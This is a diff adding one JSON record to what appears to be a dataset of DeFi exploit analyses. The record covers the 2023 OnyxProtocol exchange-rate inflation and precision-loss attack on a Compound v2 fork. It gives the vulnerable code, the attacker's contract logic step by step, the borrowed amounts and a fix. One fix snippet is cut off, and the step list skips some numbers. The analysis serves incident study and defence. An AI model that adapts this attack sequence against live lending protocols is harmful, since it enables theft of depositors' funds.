@@ -1,0 +1,51 @@
+{
+ "id": "2023__2023-11-01_OnyxProtocol_ERC4626Inflation_ETH",
+ "source_file": "2023/2023-11-01_OnyxProtocol_ERC4626Inflation_ETH.md",
+ "title": "OnyxProtocol — ERC4626 Inflation Attack Analysis",
+ "date": "2023-11-01",
+ "protocol": "OnyxProtocol",
+ "chain": "Ethereum",
+ "loss_raw": "~$2,100,000 (~1,164 ETH; confirmed by The Block, Hacken, CryptoTimes — the \"822 WETH\" figure in earlier reports was an undercount)",
+ "loss_usd": 2100000.0,
+ "root_cause": "Artificially inflating the exchangeRate via direct donation to an empty cToken market in a Compound v2 fork, then exploiting precision loss to evade debt collateralization",
+ "attack_tx": "0xf7c2...f635",
+ "vulnerable_contract": "0x5fdb...1750 (oPEPE)",
+ "classes": [
+  "integer-precision"
+ ],
+ "code_before": [
+  "// [Compound v2 CToken.sol] — Vulnerable exchangeRate calculation\nfunction exchangeRateStoredInternal() internal view returns (uint) {\n    uint _totalSupply = totalSupply;\n    if (_totalSupply == 0) {\n        // ❌ Initial state: returns a fixed initial value\n        return initialExchangeRateMantissa;\n    } else {\n        // ❌ totalCash is based on the contract's actual token balance\n        // → A direct transfer() increases only totalCash, causing rate to spike\n        uint totalCash = getCashPrior();   // ERC20.balanceOf(address(this))\n        uint cashPlusBorrowsMinusReserves = totalCash + totalBorrows - totalReserves;\n        uint exchangeRate = cashPlusBorrowsMinusReserves * expScale / _totalSupply;\n        return exchangeRate;\n    }\n}\n\n// ❌ getCashPrior(): uses raw ERC20 balance\nfunction getCashPrior() internal view virtual returns (uint) {\n    return EIP20Interface(underlying).balanceOf(address(this));\n    // → Direct transfer increases balance → rate spikes\n}",
+  "// [Compound v2 Comptroller.sol] — Vulnerable seized token calculation\nfunction liquidateCalculateSeizeTokens(\n    address cTokenBorrowed,\n    address cTokenCollateral,\n    uint actualRepayAmount\n) external view override returns (uint, uint) {\n    // ...\n    // ❌ When exchangeRate is extremely large, the denominator explodes\n    //    → precision loss: seizeTokens converges to 0\n    Exp memory numerator = mul_(Exp({mantissa: liquidationIncentiveMantissa}), priceBorrowed);\n    Exp memory denominator = mul_(Exp({mantissa: exchangeRateMantissa}), priceCollateral);\n    Exp memory ratio = div_(numerator, denominator);\n    uint seizeTokens = mul_ScalarTruncate(ratio, actualRepayAmount);\n    // ❌ If seizeTokens is 0 or very small, liquidation ends with negligible collateral seizure\n    return (NO_ERROR, seizeTokens);\n}",
+  "// IntermediateContractToken.sol — Core attack logic\nfunction start(ICErc20Delegate onyxToken) external {\n    PEPE.approve(address(oPEPE), type(uint256).max);\n\n    // Step 1: Mint minimum cTokens (1e18 PEPE → ~5e27 oPEPE)\n    oPEPE.mint(1e18);\n\n    // Step 2: Redeem nearly all oPEPE → only totalSupply = 2 remains\n    oPEPE.redeem(oPEPE.totalSupply() - 2);\n    uint256 redeemAmt = PEPE.balanceOf(address(this)) - 1;\n\n    // Step 3: ❌ Core attack — directly transfer (donate) PEPE to oPEPE\n    // With totalSupply=2, a massive PEPE balance → exchangeRate explodes\n    PEPE.transfer(address(oPEPE), PEPE.balanceOf(address(this)));\n\n    // Step 4: Register oPEPE as collateral\n    address[] memory oTokens = new address[](1);\n    oTokens[0] = address(oPEPE);\n    Unitroller.enterMarkets(oTokens);\n\n    // Step 5: ❌ Borrow full balance using over-valued collateral via manipulated exchangeRate\n    onyxToken.borrow(onyxToken.getCash() - 1);\n\n    // Step 6: Transfer tokens to the main attack contract\n    IERC20(onyxToken.underlying()).transfer(msg.sender, ...);\n\n    // Step 7: Recover a portion of the underlying asset\n    oPEPE.redeemUnderlying(redeemAmt);\n\n    // Step 8: ❌ Precision loss calculation\n    // Calculate the number of oPEPE the liquidator (main contract) will seize\n    (,,, uint256 exchangeRate) = oPEPE.getAccountSnapshot(address(this));\n    (, uint256 numSeizeTokens) = Unitroller.liquidateCalculateSeizeTokens(\n        address(onyxToken), address(oPEPE), 1\n    );\n    // ❌ precision loss: (massive exchangeRate / 1e18) * small numSeizeTokens - 2\n    uint256 mintAmount = (exchangeRate / 1e18) * numSeizeTokens - 2;\n\n    // Step 9: Re-mint oPEPE — position to preserve balance after liquidation\n    oPEPE.mint(mintAmount);\n    PEPE.transfer(msg.sender, PEPE.balanceOf(address(this)));\n}"
+ ],
+ "code_after": [
+  "// ✅ Fixed code — uses internal accounting variable\nuint256 private _trackedBalance; // updated only on mint/redeem/borrow/repay\n\nfunction getCashPrior() internal view virtual returns (uint) {\n    // Direct transfers are not reflected in _trackedBalance, so manipulation is impossible\n    return _trackedBalance;\n}",
+  "✅ Fix: use internally tracked balance that ignores direct transfers\nuint256 private internalCash; //"
+ ],
+ "steps": [
+  "**[Step 2]** Swap 4,000 WETH → PEPE (Uniswap V2 PEPE/WETH pool)",
+  "→ Acquire ~2.52 × 10³⁰ PEPE (exploiting PEPE's extremely low unit price)",
+  "**[Step 3]** Deploy `IntermediateContractETH` → Attack oETHER market:",
+  "- Mint oPEPE with 1e18 PEPE → obtain ~5e27 oPEPE",
+  "- `redeem(totalSupply - 2)` → leave only 2 oPEPE",
+  "→ exchangeRate: `200000000` (initial) → rises by **billions of times**",
+  "- `enterMarkets([oPEPE])` → register over-valued oPEPE as collateral",
+  "- `oETHER.borrow(getCash() - 1)` → borrow all ETH (334 ETH) in the market",
+  "- `redeemUnderlying(redeemAmt)` → recover a portion of underlying PEPE",
+  "- `oPEPE.mint(mintAmount)` → re-mint to preserve balance after liquidation",
+  "→ Call `oPEPE.liquidateBorrow{value: 1 wei}(intermediateETH, oPEPE)`",
+  "→ Precision loss causes very few oPEPE to be seized → effectively only ETH is taken",
+  "**[Step 5]** `oPEPE.redeem(remaining oPEPE)` → recover remaining PEPE",
+  "- oUSDC → 279 WETH profit",
+  "- oUSDT → 137 WETH profit",
+  "- oPAXG → 84 WETH profit",
+  "- oDAI → 56 WETH profit",
+  "- oBTC → 222 WETH profit",
+  "- oLINK → 56 WETH profit",
+  "**[Step 12]** Swap remaining PEPE → WETH (recover 3,990 WETH)"
+ ],
+ "other_code": [
+  "exchangeRate = (totalCash + totalBorrows - totalReserves) / totalSupply",
+  "seizeTokens = repayAmount × liquidationIncentive × priceBorrowed / (priceCollateral × exchangeRate)"
+ ]
+}
